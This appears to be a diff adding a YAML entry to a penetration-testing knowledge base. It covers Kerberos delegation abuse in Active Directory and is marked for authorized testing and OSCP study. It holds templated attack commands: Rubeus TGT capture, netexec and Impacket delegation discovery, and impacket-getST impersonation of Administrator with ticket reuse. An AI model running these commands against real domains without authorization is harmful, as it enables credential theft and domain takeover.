@@ -1,0 +1,106 @@
+# Cephalo content — AD Kerberos delegation abuse (AD-6).
+# Authorized testing only. RBCD lives in ad/acl.yaml; this file covers
+# unconstrained + constrained delegation.
+sections:
+  - id: ad.p10.deleg
+    title: AD Delegation Abuse
+    os: ad
+    phase: lateral-movement
+    order: 124
+    description: Unconstrained (TGT capture) and constrained (S4U) delegation to impersonation.
+    techniques: [ad.deleg.unconstrained, ad.deleg.constrained]
+    packs: [oscp]
+
+techniques:
+  - id: ad.deleg.unconstrained
+    title: Unconstrained delegation
+    os: [ad]
+    phase: lateral-movement
+    summary: A host trusted for unconstrained delegation caches the TGT of any caller.
+    body: |
+      Compromise a host with unconstrained delegation, then coerce a privileged
+      account (often a DC machine account) to authenticate to it — its full TGT is
+      cached and can be extracted, then replayed. The coercion step is patch/version
+      dependent (see authentication coercion).
+    commands: [ad.deleg.find, ad.deleg.unconstrained.monitor]
+    prerequisites: [ad.cred.coerce]
+    tags: [unconstrained-delegation, kerberos, pass-the-ticket]
+    services: [kerberos]
+    archetypeBand: high
+    references: [ref.rubeus, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.cred.coerce]
+
+  - id: ad.deleg.constrained
+    title: Constrained delegation (S4U)
+    os: [ad]
+    phase: lateral-movement
+    summary: Abuse S4U2self/S4U2proxy to impersonate any user to an allowed service.
+    body: |
+      An account configured for constrained delegation (msDS-AllowedToDelegateTo)
+      can request a service ticket as an arbitrary user via S4U. Impacket getST
+      forges the impersonated TGS for the allowed SPN.
+    commands: [ad.deleg.constrained.find, ad.deleg.constrained.s4u]
+    tags: [kerberos, pass-the-ticket]
+    services: [kerberos]
+    archetypeBand: high
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.acl.rbcd]
+
+commands:
+  - id: ad.deleg.find
+    title: Find delegation (Impacket)
+    template: "impacket-findDelegation '{{DOMAIN}}/{{USER}}:{{PASS}}' -dc-ip {{DC_IP}}"
+    tool: impacket
+    description: List accounts/computers with unconstrained, constrained or RBCD rights.
+    os: [ad]
+    phase: lateral-movement
+    tags: [kerberos, ad]
+    confidence: verified
+    references: [ref.impacket]
+    danger: low
+    packs: [oscp]
+  - id: ad.deleg.unconstrained.monitor
+    title: Capture cached TGTs (Rubeus)
+    template: "Rubeus.exe monitor /interval:5 /nowrap"
+    shell: powershell
+    description: On a delegation host, watch for and extract incoming TGTs.
+    os: [ad, windows]
+    phase: lateral-movement
+    tags: [unconstrained-delegation, kerberos]
+    notes:
+      - "Trigger the inbound auth with a coercion method; the captured TGT is reusable via PtT."
+    confidence: verified
+    references: [ref.rubeus]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.deleg.constrained.find
+    title: Identify constrained targets
+    template: "netexec ldap {{DC_IP}} -u '{{USER}}' -p '{{PASS}}' --trusted-for-delegation"
+    tool: netexec
+    description: Find principals trusted for (constrained) delegation and their allowed SPNs.
+    os: [ad]
+    phase: lateral-movement
+    tags: [kerberos, ad]
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+  - id: ad.deleg.constrained.s4u
+    title: S4U impersonation (getST)
+    template: "impacket-getST -spn '{{SPN}}' -impersonate Administrator '{{DOMAIN}}/{{USER}}:{{PASS}}' -dc-ip {{DC_IP}}"
+    tool: impacket
+    description: Request a TGS as Administrator for the allowed SPN via S4U2self/proxy.
+    os: [ad]
+    phase: lateral-movement
+    tags: [kerberos, pass-the-ticket]
+    notes:
+      - "Set KRB5CCNAME to the emitted .ccache, then use -k -no-pass on any exec tool."
+    confidence: verified
+    references: [ref.impacket]
+    danger: critical
+    packs: [oscp]
